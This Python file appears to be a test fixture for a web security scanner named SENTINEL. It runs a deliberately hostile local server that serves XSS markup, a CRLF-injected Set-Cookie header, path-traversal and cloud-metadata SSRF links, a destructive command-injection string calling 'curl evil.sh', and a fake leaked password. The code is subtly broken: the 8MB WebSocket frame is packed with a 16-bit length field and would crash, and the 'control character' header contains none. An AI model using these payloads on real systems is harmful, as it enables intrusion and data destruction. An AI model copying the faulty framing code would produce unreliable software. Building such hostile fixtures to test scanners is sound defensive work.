#!/usr/bin/env python3
"""SENTINEL v4.1.0 fixture — Self-Security battery (the malicious target).

A target that ATTACKS THE SCANNER: every vector below is a real attack shape
aimed at SENTINEL's own machinery. The scan must survive all of them, escape
everything that reaches reports, refuse everything out of scope, and keep
target data as DATA — never executable instruction.

  vector                          | attack shape                         | expected honest outcome
  --------------------------------+--------------------------------------+--------------------------------
  1 report HTML/JS injection      | <script>/<img onerror> in titles,    | escaped in EVERY artifact; the
    (fixture 18)                  | reflected params, evidence text      | genuine XSS finding carries
                                  |                                      | the payload ESCAPED in reports
  2 malicious response headers    | CRLF, control chars, 8KB values      | stored escaped; no header
                                  |                                      | injection into SENTINEL's output
  3 path traversal links          | /../../etc/passwd, ..%2f..%2fwin.ini | refused by scope; honest skip
  4 file:// + metadata URLs       | file:///etc/passwd, http://169.254.  | never fetched (out of scope);
    (SSRF vs SENTINEL)            | 169.254/latest/meta-data/            | boundary/skip records
  5 SSRF vs SENTINEL's own stack  | links to 127.0.0.1:8022 (REST API)   | never fetched (scope blocks
                                  | and the OAST listener port           | non-target hosts)
  6 command injection via input   | ; rm -rf /, $(reboot), `id` in       | lands as DATA in evidence;
                                  | params the scan echoes               | never executed (no shell)
  7 JSON/report injection         | target strings crafted to break      | reports stay valid JSON/HTML
                                  | JSON structure ("</script>", u2028)  |
  8 malformed GraphQL protocol    | /api/graphql returning 10k-deep      | graphql engine degrades to a
                                  | nested JSON + invalid UTF-8          | boundary, never a crash
  9 oversized WebSocket frames    | /ws/evil sending 8MB binary frames   | WS client caps at 1MB, honest
                                  | + bad UTF-8 text                     | protocol_not_understood
  10 secret leakage discipline    | a page echoing a password-shaped     | masked in every artifact
                                  | value                                | (prefix+length only)

GROUND TRUTH: exactly ONE genuine finding class (reflected XSS on
/vuln/xss? q= — the payload in its evidence is the ATTACKER'S markup and must
appear ESCAPED in reports); zero crashes; zero out-of-scope fetches.
"""
import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

MALICIOUS_GT = {
    "findings": ["xss_reflected"],        # exactly one genuine class
    "must_escape": ["<script>alert(1)</script>", "<img src=x onerror=alert(2)>"],
    "must_never_fetch": ["file://", "169.254.169.254", "127.0.0.1:8022",
                         "127.0.0.1:8443"],
    "zero_crashes": True,
}

EVIL_TITLE = '<script>alert("xss-title")</script>'
EVIL_IMG = '<img src=x onerror="alert(2)">'
EVIL_CMD = '; rm -rf / --no-preserve-root $(reboot) `curl evil.sh`'
HUGE_HEADER = "A" * 8192
DEEP_JSON = "{" * 10000 + '"x":1' + "}" * 10000
PASSWORD_LEAK = "db_password=Sup3rS3cretP@ss!"

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, code, body, headers=None, ctype="text/html; charset=utf-8"):
        b = body.encode("utf-8", "replace") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(b)))
        # vector 2: malicious response headers (CRLF-shaped + huge + control)
        self.send_header("X-Evil", "value\r\nSet-Cookie: pwned=1")
        self.send_header("X-Huge", HUGE_HEADER)
        self.send_header("X-Control", "abd")
        for h, v in (headers or []):
            self.send_header(h, v)
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        path = self.path.split("?")[0]
        q = parse_qs(self.path.split("?", 1)[1]) if "?" in self.path else {}
        if path == "/":
            # vectors 1,3,4,5: the landing page carries attacker markup in its
            # title + traversal/file/metadata/SSRF links the crawler must refuse
            return self._send(200, f"""<html><head><title>{EVIL_TITLE}</title></head>
<body><h1>Malicious fixture {EVIL_IMG}</h1>
<a href="/vuln/xss?q=probe">xss probe</a>
<a href="/../../etc/passwd">traversal link</a>
<a href="/..%2f..%2f..%2fetc%2fpasswd">encoded traversal</a>
<a href="file:///etc/passwd">file scheme</a>
<a href="http://169.254.169.254/latest/meta-data/">metadata</a>
<a href="http://127.0.0.1:8022/api/runs">sentinel rest api</a>
<a href="http://127.0.0.1:8443/oast-callback">sentinel oast</a>
<a href="/evil-headers">evil headers</a>
<a href="/leak">secret leak</a>
<script>
fetch('/api/data?x=1');
new WebSocket('ws://127.0.0.1/ws');
var s = "{EVIL_TITLE}";
</script>
</body></html>""")
        if path == "/vuln/xss":
            # the ONE genuine finding: reflected XSS (unescaped echo) — the
            # attacker markup rides the SAME line as the reflection, so the
            # finding's evidence carries it and every report artifact must
            # keep it ESCAPED
            val = (q.get("q", [""])[0])[:100]
            return self._send(200, f"<html><body>results for: {val} {EVIL_IMG}"
                                   f" {EVIL_TITLE}</body></html>")
        if path == "/evil-headers":
            # vector 7: content that must not break JSON/HTML reports
            return self._send(200, '<html><body>\u2028\u2029 "</script>" '
                                   '{"json":"break"} ]]></script>'
                                   f'<p id="{EVIL_TITLE}">ok</p></body></html>')
        if path == "/leak":
            return self._send(200, f"<html><body>config: {PASSWORD_LEAK}</body></html>")
        if path == "/api/data":
            # vector 6: command-injection-shaped values echoed back as data
            val = (q.get("x", [""])[0])[:80]
            return self._send(200, json.dumps({"echo": val, "cmd": EVIL_CMD}),
                              ctype="application/json")
        if path == "/api/graphql":
            # vector 8: malformed GraphQL protocol (deep nesting + invalid
            # UTF-8 bytes + non-JSON 500s) — the engine must degrade honestly
            if "deep" in self.path:
                return self._send(200, DEEP_JSON, ctype="application/json")
            return self._send(500, b"\xff\xfe broken \x00 utf8",
                              ctype="application/json")
        return self._send(404, "<html><body>not found</body></html>")

    def do_POST(self):
        path = self.path.split("?")[0]
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length else b""
        if path == "/api/graphql":
            # malformed introspection: deep nesting to stress the parser
            return self._send(200, DEEP_JSON, ctype="application/json")
        return self._send(404, "<html><body>not found</body></html>")


class WsEvilServer:
    """Vector 9: a WebSocket channel that answers the handshake then floods
    the client with oversized binary frames and invalid-UTF-8 text frames."""

    def __init__(self, port=0):
        import socket as _s
        import base64 as _b64
        import hashlib as _hl
        self.srv = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
        self.srv.setsockopt(_s.SOL_SOCKET, _s.SO_REUSEADDR, 1)
        self.srv.bind(("127.0.0.1", port))
        self.srv.listen(4)
        self.port = self.srv.getsockname()[1]
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def _loop(self):
        import struct as _st
        while True:
            try:
                conn, _ = self.srv.accept()
            except OSError:
                return
            threading.Thread(target=self._handle, args=(conn,), daemon=True).start()

    def _handle(self, conn):
        import base64 as _b64
        import hashlib as _hl
        import struct as _st
        try:
            conn.settimeout(5)
            req = b""
            while b"\r\n\r\n" not in req and len(req) < 8192:
                c = conn.recv(4096)
                if not c:
                    return
                req += c
            import re as _re
            mk = _re.search(rb"Sec-WebSocket-Key:\s*(\S+)", req)
            if not mk:
                conn.close()
                return
            key = _b64.b64encode(_hl.sha1(
                (mk.group(1).decode() +
                 "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()
            ).digest()).decode()
            conn.sendall(("HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\n"
                          f"Sec-WebSocket-Accept: {key}\r\n\r\n").encode())

            def frame(op, payload):
                n = len(payload)
                hdr = _st.pack("!BB", 0x80 | op, n) if n < 126 else \
                    _st.pack("!BBH", 0x80 | op, 126, n)
                conn.sendall(hdr + payload)

            # oversized binary (8MB) + invalid-UTF-8 text + tiny valid text
            frame(0x2, b"\xde\xad\xbe\xef" * (2 * 1024 * 1024))
            frame(0x1, b"\xff\xfe\x00 broken utf8 text")
            frame(0x1, b"ok|tiny|message")
        except OSError:
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass

    def close(self):
        self.srv.close()


def serve(port: int = 0) -> tuple[str, ThreadingHTTPServer]:
    srv = ThreadingHTTPServer(("127.0.0.1", port), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return f"http://127.0.0.1:{srv.server_address[1]}", srv
